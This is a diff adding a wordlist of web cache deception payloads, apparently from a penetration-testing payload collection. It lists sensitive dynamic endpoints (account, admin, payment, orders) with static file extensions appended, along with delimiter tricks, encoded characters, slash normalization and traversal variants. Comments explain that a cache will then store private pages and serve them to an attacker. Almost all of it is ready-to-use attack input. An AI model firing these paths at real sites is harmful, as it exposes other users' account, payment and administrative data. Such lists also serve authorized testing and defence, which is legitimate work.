@@ -1,0 +1,65 @@
+# ============================================================
+# Web Cache Deception — Path Manipulation
+# ============================================================
+
+# ---- Classic Web Cache Deception ----
+# Append static extension to dynamic endpoint
+# Cache sees .css/.js/.png → stores it → serves to attacker
+
+# ---- Append Static Extensions ----
+/api/profile/account.css
+/api/profile/account.js
+/api/profile/account.png
+/api/profile/account.jpg
+/api/profile/account.gif
+/api/profile/account.ico
+/api/profile/account.woff
+/api/profile/account.woff2
+/api/profile/account.ttf
+/api/profile/account.svg
+/api/profile/account.map
+/api/profile/account.json
+
+# ---- Common Dynamic Endpoints to Target ----
+/account
+/profile
+/dashboard
+/settings
+/api/user
+/api/me
+/api/profile
+/admin
+/api/admin/users
+/api/orders
+/api/payment
+/api/transactions
+
+# ---- Combined Paths ----
+/account/account.css
+/profile/profile.js
+/settings/settings.png
+/dashboard/main.css
+/api/user/user.json
+
+# ---- Path Delimiter Tricks ----
+/api/profile;.js
+/api/profile?.js
+/api/profile#.js
+/api/profile/.js
+/api/profile%0A.js
+/api/profile%09.css
+
+# ---- Slash Normalization ----
+/api//profile.css
+/api/./profile.css
+/api/%2fprofile.css
+//profile.css
+///profile.css
+
+# ---- Disguise with Directory ----
+/api/profile/nonexistent/../../account.css
+/api/profile/%2e%2e/account.css
+
+# ---- Language/Region Append ----
+/profile/en/account.css
+/profile/account.css/en
